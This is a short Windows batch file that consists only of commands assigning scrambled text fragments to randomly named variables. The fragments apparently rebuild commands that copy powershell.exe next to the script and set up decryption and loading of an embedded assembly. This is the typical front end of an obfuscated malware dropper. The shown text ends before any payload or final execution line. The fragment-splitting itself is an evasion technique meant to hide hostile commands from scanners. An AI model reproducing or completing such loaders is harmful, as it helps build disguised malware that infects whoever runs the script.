@echo off
set "MMOVkzEzxE=y "
set "ONoaAsIqsC=rS"
set "UTDHsnIcoc=ws"
set "emxzZMcsdI=ll"
set "TzHFZTLVeN=s\"
set "AigmiFyoWN=Wi"
set "TUUAymtbrX=1."
set "rnpYllcchz=co"
set "mlXLPqiQUs=in"
set "grmvIBlncg=Po"
set "XtQvdXuHUA=py"
set "sIHbTKhgES=po"
set "eAcUVtaVZe=.e"
set "sUTEYbEKdS=we"
set "GZHLcOeSEo=rs"
set "IgBRmaNLRW=he"
set "kiMkJAeUZp=:\"
set "YSCuTrEOPV=em"
set "MiYSwALNWq=32"
set "ZGttXknTHO=he"
set "iLkOJXNWvk=Sy"
set "UbmFStBiLp= /"
set "wbpucFHAYt=st"
set "oTTgQYtwRB=0\"
set "mVBGoOHFLC=ow"
set "FpBpSqixDS=xe"
set "sZgAxndwYB=do"
set "aLkAgRknCu=\W"
set "QmuPPyecFE=nd"
set "cPuSjZaZJq=ll"
set "IXYvntdlUq=\v"
set "XBQAdhUTtX=we"
set "bSimtGZhBA= C"
set "pgYkUYxWhE= %~dp0"
set "EQClUEaYUx=cd"
set "qkcGtiNJAT=join"
set "mAGxieNtAb= '')"
set "tkRMXoweGx=e = "
set "fqmFYxvqCV=.Ass"
set "aRbqyqjQlM=s.Pa"
set "rRxJByqpBl=eam("
set "APjSqqqsbS=pher"
set "QwHOfiSTrY=$OuT"
set "aLcHYnlhKe='0Pg"
set "dMByNUiUbi=S46e"
set "gbmDWKzEav=yhHr"
set "WXVtCZhsXK=RmAx"
set "UklNfdCOgr=comm"
set "yKEJUyuMbb=ptor"
set "fkIJtFJLKs=();$"
set "abfnHywSRf=);$k"
set "GigRixFPnY=ve);"
